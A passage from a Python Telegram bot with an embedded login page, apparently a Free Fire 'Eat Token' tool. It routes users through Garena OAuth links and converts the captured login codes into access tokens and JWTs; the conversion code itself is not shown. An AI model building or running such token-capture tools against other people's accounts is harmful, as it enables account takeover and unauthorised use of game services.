            Continue with your preferred account
        </p>


        <!-- GOOGLE -->
        <button class="login-btn google"
                onclick="openLink('https://auth.garena.com/universal/oauth?platform=8&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/')">

            <div class="provider-icon">
                G
            </div>

            <div class="login-text">
                <strong>Continue with Google</strong>
                <span>Sign in securely with Google</span>
            </div>

            <div class="arrow">›</div>

        </button>


        <!-- FACEBOOK -->
        <button class="login-btn facebook"
                onclick="openLink('https://auth.garena.com/universal/oauth?platform=3&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/')">

            <div class="provider-icon">
                f
            </div>

            <div class="login-text">
                <strong>Continue with Facebook</strong>
                <span>Sign in securely with Facebook</span>
            </div>

            <div class="arrow">›</div>

        </button>


        <!-- APPLE -->
        <button class="login-btn apple"
                onclick="openLink('https://auth.garena.com/universal/oauth?platform=10&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/')">

            <div class="provider-icon">
                ●
            </div>

            <div class="login-text">
                <strong>Continue with Apple</strong>
                <span>Sign in securely with Apple</span>
            </div>

            <div class="arrow">›</div>

        </button>


        <!-- X -->
        <button class="login-btn x"
                onclick="openLink('https://auth.garena.com/universal/oauth?platform=11&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/')">

            <div class="provider-icon">
                𝕏
            </div>

            <div class="login-text">
                <strong>Continue with X</strong>
                <span>Sign in securely with X</span>
            </div>

            <div class="arrow">›</div>

        </button>


        <!-- VK -->
        <button class="login-btn vk"
                onclick="openLink('https://auth.garena.com/universal/oauth?platform=5&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/')">

            <div class="provider-icon">
                VK
            </div>

            <div class="login-text">
                <strong>Continue with VK</strong>
                <span>Sign in securely with VK</span>
            </div>

            <div class="arrow">›</div>

        </button>


        <!-- SECURITY -->
        <div class="note">

            <div class="note-icon">
                i
            </div>

            <div>
                Your authentication is handled by the
                respective provider. We do not store your
                password or sensitive information.
            </div>

        </div>

    </section>


    <!-- YOUTUBE / SOCIAL -->
    <section class="social-card">

        <div class="youtube-box"></div>

        <div class="social-info">
            <strong>Code Token Capture?</strong>
            <span>
                Subscribe to our YouTube channel for latest updates
            </span>
        </div>

        <div class="social-links">

            <a class="social-btn"
               href="https://www.youtube.com/@KrishnaCoderOfficial"
               target="_blank"
               rel="noopener noreferrer">
                YouTube →
            </a>

            <a class="social-btn"
               href="https://instagram.com/KrishnaCoderOfficial"
               target="_blank"
               rel="noopener noreferrer">
                Instagram →
            </a>

            <a class="social-btn"
               href="https://t.me/FREEFlRECODE"
               target="_blank"
               rel="noopener noreferrer">
                Telegram →
            </a>

        </div>

    </section>


    <!-- FOOTER -->
    <footer>
        © 2026 Eat Token · Made with
        <b>♥ by Krishna Coder</b>
    </footer>

</main>


<script>

function openLink(url){

    window.open(
        url,
        "_blank",
        "noopener,noreferrer"
    );

}

</script>

</body>
</html>"""    


def run_web():
    try:
        web_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    except Exception as e:
        logger.exception(f"Web server error: {e}")


def start_web():
    Thread(target=run_web, daemon=True, name="WebServer").start()


def main():
    init_db()
    start_web()
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(30)
        .pool_timeout(30)
        .build()
    )
    conv_code = ConversationHandler(
        entry_points=[
            MessageHandler(
                filters.Regex("^ᴇᴀᴛ ᴛᴏᴋᴇɴ ᴛᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ$"),
                ask_code,
            )
        ],
        states={
            WAITING_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_code)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )
    conv_owner = ConversationHandler(
        entry_points=[CallbackQueryHandler(owner_cb, pattern="^owner_")],
        states={
            WAITING_BAN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ban)
            ],
            WAITING_UNBAN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unban)
            ],
            WAITING_BROADCAST: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_broadcast)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(check_joined, pattern="^check_joined$"))
    app.add_handler(conv_code)
    app.add_handler(conv_owner)
    app.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_router))
    app.add_error_handler(error_handler)
    print("Bot running... TZ=Asia/Kolkata | EAT→Access→JWT")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
